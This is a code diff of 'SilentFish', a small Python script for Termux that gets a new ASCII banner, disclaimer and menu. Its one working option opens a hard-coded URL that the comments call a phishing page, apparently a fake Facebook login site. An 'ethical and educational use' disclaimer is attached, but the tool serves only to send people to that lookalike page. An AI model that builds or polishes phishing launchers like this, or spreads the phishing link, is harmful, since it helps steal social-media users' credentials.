@@ -1,46 +1,77 @@
 from colorama import Fore, Style
 import os
+import time
 
-# Disclaimer
-DISCLAIMER = """
-This tool is developed solely for educational purposes to demonstrate security 
-vulnerabilities and raise awareness about phishing attacks. Unauthorized use 
-of this tool for malicious purposes is strictly prohibited and may lead to severe 
-legal consequences. Use responsibly and ethically.
+# Constants
+PHISHING_URL = "https://webfacebook.vercel.app"
+TOOL_NAME = "SilentFish"
+DEVELOPER_INFO = "Developed by: Yamman Butt\nTool Version: 1.0"
+
+# Clean and Clear ASCII Art Logo
+SILENTFISH_LOGO = f"""
+{Fore.CYAN}
+   ███████╗██╗██╗     ███████╗███████╗███╗   ███╗███████╗████████╗███████╗
+   ██╔════╝██║██║     ██╔════╝██╔════╝████╗ ████║██╔════╝╚══██╔══╝██╔════╝
+   █████╗  ██║██║     █████╗  █████╗  ██╔████╔██║█████╗     ██║   █████╗  
+   ██╔══╝  ██║██║     ██╔══╝  ██╔══╝  ██║╚██╔╝██║██╔══╝     ██║   ██╔══╝  
+   ███████╗██║███████╗███████╗███████╗██║ ╚═╝ ██║███████╗   ██║   ███████╗
+   ╚══════╝╚═╝╚══════╝╚══════╝╚══════╝╚═╝     ╚═╝╚══════╝   ╚═╝   ╚══════╝
+{Style.RESET_ALL}
 """
 
-# Tool Header
-def show_header():
-    print(Style.BRIGHT + Fore.RED + "=============== FACEBOOK TOOL ===============" + Style.RESET_ALL)
-    print(Style.BRIGHT + Fore.BLUE + "=============== Developed By Yamman ===============" + Style.RESET_ALL)
-    print(Style.BRIGHT + Fore.YELLOW + DISCLAIMER + Style.RESET_ALL)
+# Disclaimer
+DISCLAIMER = f"""
+{Fore.YELLOW}This tool is designed for ethical and educational purposes only. 
+Unauthorized use of this tool for malicious activities is strictly prohibited 
+and may result in legal consequences. Use responsibly.{Style.RESET_ALL}
+"""
 
-# Tool Menu
+# Styled Banner
+def show_banner():
+    os.system("clear")
+    print(SILENTFISH_LOGO)
+    print(Style.BRIGHT + Fore.GREEN + "=" * 70)
+    print(Fore.GREEN + f"                    Welcome to {TOOL_NAME} v1.0")
+    print(Fore.GREEN + "=" * 70 + Style.RESET_ALL)
+
+# Styled Disclaimer
+def show_disclaimer():
+    print(DISCLAIMER)
+
+# Menu Display
 def show_menu():
-    print(Style.BRIGHT + Fore.CYAN + "\n[ MENU OPTIONS ]" + Style.RESET_ALL)
-    print(Fore.GREEN + "1. Facebook (Open Page)" + Style.RESET_ALL)
-    
-    print(Fore.GREEN + "2. Exit" + Style.RESET_ALL)
+    print(Style.BRIGHT + Fore.GREEN + "\n[ MAIN MENU ]" + Style.RESET_ALL)
+    print(Fore.MAGENTA + "1. Facebook ")
+    print("2. Exit" + Style.RESET_ALL)
 
-# Open Facebook (Phishing) Page
+# Option: Open Phishing Page
 def open_facebook():
-    phishing_link = "https://webfacebook.vercel.app"  # Replace with your phishing page link
-    print(Fore.YELLOW + f"Opening the Facebook page: {phishing_link}" + Style.RESET_ALL)
-    os.system(f"termux-open-url {phishing_link}")
+    print(Fore.YELLOW + f"\nRedirecting to: {PHISHING_URL}" + Style.RESET_ALL)
+    time.sleep(2)
+    os.system(f"termux-open-url {PHISHING_URL}")
 
-# Main Program
+# Exit Program
+def exit_tool():
+    print(Fore.GREEN + "\nExiting the tool. Stay safe and ethical!" + Style.RESET_ALL)
+    time.sleep(1)
+    os.system("clear")
+    exit()
+
+# Main Function
 def main():
-    show_header()
+    show_banner()
+    show_disclaimer()
+
     while True:
         show_menu()
         choice = input(Fore.CYAN + "\nEnter your choice: " + Style.RESET_ALL)
         if choice == "1":
             open_facebook()
+        
         elif choice == "2":
-            print(Fore.GREEN + "Exiting tool. Stay ethical!" + Style.RESET_ALL)
-            break
+            exit_tool()
         else:
-            print(Fore.RED + "Invalid choice, please try again!" + Style.RESET_ALL)
+            print(Fore.RED + "Invalid choice. Please try again!" + Style.RESET_ALL)
 
 if __name__ == "__main__":
     main()
